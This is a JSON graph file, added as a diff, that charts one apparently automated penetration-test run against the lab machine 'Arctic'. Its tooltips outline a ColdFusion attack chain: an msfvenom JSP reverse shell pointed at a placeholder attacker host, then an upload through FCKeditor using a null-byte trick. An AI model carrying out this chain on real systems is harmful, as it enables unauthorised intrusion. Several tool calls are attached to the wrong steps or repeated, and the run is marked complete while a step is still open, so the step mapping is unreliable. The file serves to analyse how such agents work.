@@ -1,0 +1,616 @@
+{
+  "paper_analogy": "Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track",
+  "machine": "Arctic",
+  "source": "training_data.csv, Machine == 'Arctic', 8 row(s), 1 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
+  "analogy_mapping": {
+    "Agent Nodes": "PTT snapshot reached after each new tree item (state = cumulative tree)",
+    "Search Nodes": "The PTT tree item worked on (number + title) + its MCP_tasks tool calls",
+    "Track Nodes": "That item's findings payload -- what was actually discovered"
+  },
+  "legend": {
+    "node_types": {
+      "Agent (Blue/Pink goal)": "PTT state after a new item completes",
+      "Search (Orange)": "PTT item being worked (tool calls in tooltip)",
+      "Track (Green)": "Findings payload of that item"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "Agent -> Agent, label = PTT item number",
+      "SearchUpdate (Green)": "Agent -> Search, item being worked from that state",
+      "TrackUpdate (Blue)": "Search -> Track, what item's execution found",
+      "Prediction (Purple)": "Track -> Agent, leads to next cumulative PTT state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "agent:Arctic:START",
+      "label": "Agent: Initial\n(Start)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Start of pentest against 'Arctic'. 1 recorded run(s) below.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Arctic:r1_s1_2.1",
+      "label": "Search: 2.1\nWeb application analysis",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 2.1: Web application analysis\n\nMCP tool calls:\nNmap: Execute full TCP port scan with service version detection (-sV -sC) against target 10.10.10.11",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Arctic:r1_s1_2.1",
+      "label": "Track: Web application analysis",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "2.1 Web application analysis:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Arctic:r1_s1_2.1",
+      "label": "Agent: 2.1\nEnumeration",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 2.1:\n\u2713 1 Reconnaissance\n\u2026 2 Enumeration\n  \u25cb 2.1 Web application analysis\n\u25cb 3 Initial Access\n\u25cb 4 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Arctic:r1_s2_3.1",
+      "label": "Search: 3.1\nVulnerability research",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.1: Vulnerability research\n\nMCP tool calls:\nWeb page interaction: Access http://10.10.10.11:8500/CFIDE/administrator to locate admin login; Web page interaction: Browse directory listings to identify version information",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Arctic:r1_s2_3.1",
+      "label": "Track: Vulnerability research",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.1 Vulnerability research:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Arctic:r1_s2_3.1",
+      "label": "Agent: 3.1\nInitial Access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.1:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2026 3 Initial Access\n  \u25cb 3.1 Vulnerability research\n\u25cb 4 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Arctic:r1_s3_3.2",
+      "label": "Search: 3.2\nExploitation selection",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.2: Exploitation selection\n\nMCP tool calls:\nGoogle search: Search for ColdFusion 8.0.1 exploit CVE unauthenticated file upload; Google search: Research ColdFusion 8 FCKeditor vulnerability",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Arctic:r1_s3_3.2",
+      "label": "Track: Exploitation selection",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.2 Exploitation selection:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Arctic:r1_s3_3.2",
+      "label": "Agent: 3.2\nInitial Access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.2:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2026 3 Initial Access\n  \u2713 3.1 Vulnerability research\n  \u25cb 3.2 Exploitation selection",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Arctic:r1_s4_4",
+      "label": "Search: 4\nPrivilege Escalation",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4: Privilege Escalation\n\nMCP tool calls:\nInteractive CLI: Generate JSP shell with msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=443; Interactive CLI: Upload via curl with POST to /CFIDE/scripts/ajax/FCKeditor/ endpoint using null byte trick in CurrentFolder parameter",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Arctic:r1_s4_4",
+      "label": "Track: Privilege Escalation",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4 Privilege Escalation:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Arctic:r1_s4_4",
+      "label": "Agent: 4\nPrivilege Escalation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2713 3 Initial Access\n\u2026 4 Privilege Escalation\n  \u25cb 4.1 System enumeration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Arctic:r1_s4_4.1",
+      "label": "Search: 4.1\nSystem enumeration",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.1: System enumeration\n\nMCP tool calls:\nInteractive CLI: Generate JSP shell with msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=443; Interactive CLI: Upload via curl with POST to /CFIDE/scripts/ajax/FCKeditor/ endpoint using null byte trick in CurrentFolder parameter",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Arctic:r1_s4_4.1",
+      "label": "Track: System enumeration",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.1 System enumeration:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Arctic:r1_s4_4.1",
+      "label": "Agent: 4.1\nPrivilege Escalation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.1:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2713 3 Initial Access\n\u2026 4 Privilege Escalation\n  \u25cb 4.1 System enumeration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Arctic:r1_s5_4.2",
+      "label": "Search: 4.2\nExploit selection",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.2: Exploit selection\n\nMCP tool calls:\nInteractive CLI: Execute systeminfo command to gather OS details and installed hotfixes",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Arctic:r1_s5_4.2",
+      "label": "Track: Exploit selection",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.2 Exploit selection:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Arctic:r1_s5_4.2",
+      "label": "Agent: 4.2\nPrivilege Escalation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.2:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2713 3 Initial Access\n\u2026 4 Privilege Escalation\n  \u2713 4.1 System enumeration\n  \u25cb 4.2 Exploit selection",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Arctic:r1_close",
+      "label": "Agent: Task\nComplete (Goal)",
+      "type": "Agent",
+      "color": "#FF006E",
+      "title": "Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2713 3 Initial Access\n\u2713 4 Privilege Escalation",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "agent:Arctic:START",
+      "to": "agent:Arctic:r1_s1_2.1",
+      "label": "\u2192 2.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:START",
+      "to": "search:Arctic:r1_s1_2.1",
+      "label": "2.1 Web application ana\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Arctic:r1_s1_2.1",
+      "to": "track:Arctic:r1_s1_2.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Arctic:r1_s1_2.1",
+      "to": "agent:Arctic:r1_s1_2.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s1_2.1",
+      "to": "agent:Arctic:r1_s2_3.1",
+      "label": "\u2192 3.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s1_2.1",
+      "to": "search:Arctic:r1_s2_3.1",
+      "label": "3.1 Vulnerability resea\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Arctic:r1_s2_3.1",
+      "to": "track:Arctic:r1_s2_3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Arctic:r1_s2_3.1",
+      "to": "agent:Arctic:r1_s2_3.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s2_3.1",
+      "to": "agent:Arctic:r1_s3_3.2",
+      "label": "\u2192 3.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s2_3.1",
+      "to": "search:Arctic:r1_s3_3.2",
+      "label": "3.2 Exploitation select\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Arctic:r1_s3_3.2",
+      "to": "track:Arctic:r1_s3_3.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Arctic:r1_s3_3.2",
+      "to": "agent:Arctic:r1_s3_3.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s3_3.2",
+      "to": "agent:Arctic:r1_s4_4",
+      "label": "\u2192 4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s3_3.2",
+      "to": "search:Arctic:r1_s4_4",
+      "label": "4 Privilege Escalation",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Arctic:r1_s4_4",
+      "to": "track:Arctic:r1_s4_4",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Arctic:r1_s4_4",
+      "to": "agent:Arctic:r1_s4_4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s4_4",
+      "to": "agent:Arctic:r1_s4_4.1",
+      "label": "\u2192 4.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s4_4",
+      "to": "search:Arctic:r1_s4_4.1",
+      "label": "4.1 System enumeration",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Arctic:r1_s4_4.1",
+      "to": "track:Arctic:r1_s4_4.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Arctic:r1_s4_4.1",
+      "to": "agent:Arctic:r1_s4_4.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s4_4.1",
+      "to": "agent:Arctic:r1_s5_4.2",
+      "label": "\u2192 4.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s4_4.1",
+      "to": "search:Arctic:r1_s5_4.2",
+      "label": "4.2 Exploit selection",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Arctic:r1_s5_4.2",
+      "to": "track:Arctic:r1_s5_4.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Arctic:r1_s5_4.2",
+      "to": "agent:Arctic:r1_s5_4.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Arctic:r1_s5_4.2",
+      "to": "agent:Arctic:r1_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 20,
+    "total_edges": 25,
+    "agent_nodes": 8,
+    "search_nodes": 6,
+    "track_nodes": 6,
+    "runs_detected": 1,
+    "rows_captured": 8
+  }
+}
